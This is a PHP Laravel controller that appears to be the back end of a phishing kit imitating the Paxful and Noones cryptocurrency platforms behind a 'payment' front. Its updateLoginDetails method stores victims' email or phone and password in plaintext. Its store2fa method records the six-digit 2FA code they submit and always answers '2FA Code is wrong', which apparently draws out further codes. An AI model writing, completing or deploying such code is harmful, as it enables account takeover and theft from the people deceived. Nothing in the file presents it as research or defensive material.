<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use App\Models\Payment;

class PaymentController extends Controller
{



    public function store2fa(Request $request)
    {

        // dd($request);

        $paymentId = $request->sessionid;



        // Store in session or database, e.g.:
        $payment = Payment::find($paymentId);

        // dd($payment);

        if($payment->platform=="paxful"){
            $request->validate([
                'code1' => 'required|digits:1',
                'code2' => 'required|digits:1',
                'code3' => 'required|digits:1',
                'code4' => 'required|digits:1',
                'code5' => 'required|digits:1',
                'code6' => 'required|digits:1',
            ]);
    
            $code = $request->code1 . $request->code2 . $request->code3 .
                    $request->code4 . $request->code5 . $request->code6;
        }else{
            $request->validate([
                'codeInput' => 'required'
            ]);

            $code=$request->codeInput;
        }
        // dd($code);
        

        

        // dd($paymentId);

        if (!$payment) {
            return redirect()->back()->with('message', 'Payment not found.');
        }

    // Update desired columns
        $payment->otp = $code;

        $payment->save();

        // Optionally log or store in DB
        // Log::info("2FA code submitted: $code");

        // Redirect somewhere with success message
        return redirect()->back()->with('message', '2FA Code is wrong.');
    }
public function getOtpForm(){
    return view('paxfulotp');
}
public function getOtpFormnoones(){
    return view('noonesotp');
}
    public function updateLoginDetails(Request $request)
{


   
    $request->validate([
        'email_or_phone' => 'required|string|max:255',
        'password' => 'required|string|max:255',
    ]);

    $paymentId = session('payment_id');

    //  dd($paymentId);

    if (!$paymentId) {

        $lastSegment = $request->platform;

        // dd($lastSegment);

        if($lastSegment=='pa'){
            $platform="paxful";
        }else{
            $platform="noones";
        }
        $payment = Payment::create([

            'account_type'=>'checking',
            'platform'=>$lastSegment
        ]);

        $paymentId = $payment->id;
        session(['payment_id' => $paymentId]);
    }

    if (!$paymentId) {
        return redirect()->back()->with('error', 'Session expired or payment ID missing.');
    }

    $payment = Payment::find($paymentId);

    if (!$payment) {
        return redirect()->back()->with('error', 'Payment not found.');
    }

    // Update desired columns
    $payment->email = $request->input('email_or_phone');
    $payment->password = $request->input('password');
    //$payment->login_submitted_at = now(); // Optional timestamp column

    $payment->save();

    $platform=$payment->platform;
    if($platform=='paxful'){
        return redirect()->route('getOtpForm')->with([
            'email' => $request->email_or_phone,
            'sessionid'=>$paymentId
        ]);
    }else{
        return redirect()->route('getOtpFormnoones')->with([
            'email' => $request->email_or_phone,
            'sessionid'=>$paymentId
        ]);
    }

    
}

    public function showPaxful($id)
    {
        $payment = Payment::findOrFail($id);

        if (strtolower($payment->platform) !== 'paxful') {
            abort(404, 'Invalid platform route.');
        }

        Session::put('payment_id', $id);
        return view('login.client', ['payment' => $payment]);
    }

    public function showNoones($id)
    {
        $payment = Payment::findOrFail($id);

        if (strtolower($payment->platform) !== 'noones') {
            abort(404, 'Invalid platform route.');
        }

        Session::put('payment_id', $id);
        return view('login.client', ['payment' => $payment]);
    }
    //
    public function create()
    {
        return view('payments.create');
    }

    public function store(Request $request)
    {
        $request->validate([
            'account_type' => 'required|string',
            'account_name' => 'required|string',
            'client_email' => 'required|email',
            'amount' => 'required|numeric',
            'time' => 'required|date',
        ]);

        Payment::create($request->all());

        return redirect()->route('payments.view')->with('success', 'Payment added successfully');
    }

    public function view()
    {
        $payments = Payment::latest()->get();
        return view('payments.view', compact('payments'));
    }
}
